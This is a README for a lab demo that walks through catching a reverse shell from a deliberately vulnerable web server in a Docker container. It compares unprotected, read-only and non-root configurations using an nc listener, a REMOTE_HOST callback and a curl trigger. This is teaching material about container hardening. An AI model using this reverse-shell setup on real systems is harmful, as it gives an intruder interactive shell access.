# README

Demonstrates getting access into a container

üìù TODO:

* Is it possible to escape the read-only and run tools in the package lists?  


## Find IP

```sh
#MacOS
LOCAL_IP=$(ifconfig en0 inet | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | head -n 1)  
echo ${LOCAL_IP}
```

## No Protection

### Shell 1

Run the stupid webserver.  Retrieve your host ip address and replace.  

```sh
docker build --target no_protection -t reverseshell . 
# Make sure that LOCAL_IP is set
docker run --env REMOTE_HOST=${LOCAL_IP} --env REMOTE_PORT=8888 --rm -p 8080:8080 reverseshell
```

### Shell 2

Run the callback service in a seperate shell 

```sh
nc -l -p 8888 -vvv 
```

### Shell 3

Invoke the exploit against the web server

```sh
curl localhost:8080
```

Now go back to shell 2 running the callback and list the contents.  
You will see a bash prompt that is connected to the container.  

```sh 
# Try and install something.
apt install curl

# Exiting will kill the container process
exit
```

## Readonly

### Shell 1

Run --read-only.  

```sh
docker build --target no_protection -t reverseshell . 
# Make sure that LOCAL_IP is set
docker run --read-only --env REMOTE_HOST=${LOCAL_IP} --env REMOTE_PORT=8888 --rm -p 8080:8080 reverseshell
```

### Shell 2

Run the callback service in a seperate shell 

```sh
nc -l -p 8888 -vvv 
```

### Shell 3

Invoke the exploit against the web server

```sh
curl localhost:8080
```

Now go back to shell 2 running the callback and list the contents.  
You will see a bash prompt that is connected to the container.  

```sh
# Try and install something - but this time it FAILS.
apt install curl

# Exiting will kill the container process
exit
```

## Nonroot

### Shell 1

Build and run a non-root user image.  

```sh
docker build --target non_root -t reverseshell . 
# Make sure that LOCAL_IP is set
docker run --env REMOTE_HOST=${LOCAL_IP} --env REMOTE_PORT=8888 --rm -p 8080:8080 reverseshell
```

### Shell 2

Run the callback service in a seperate shell 

```sh
nc -l -p 8888 -vvv 
```

### Shell 3

Invoke the exploit against the web server

```sh
curl localhost:8080
```

Now go back to shell 2 running the callback and list the contents.  
You will see a bash prompt that is connected to the container.  

```sh 
# You're webuser now.
whoami
# Try and install something - but this time it FAILS.
apt install curl


# Exiting will kill the container process
exit
```

## Troubleshooting  

Test with a simple webservice  

```sh
docker run -it --rm -p 8080:8080 --entrypoint /bin/bash reverseshell
echo -e "HTTP/1.1 200 OK\n\n $(date)" | nc -l -p 8080 -q 1
curl localhost:8080
```

```sh
tmuxinator
tmuxinator stop reverseshell
```
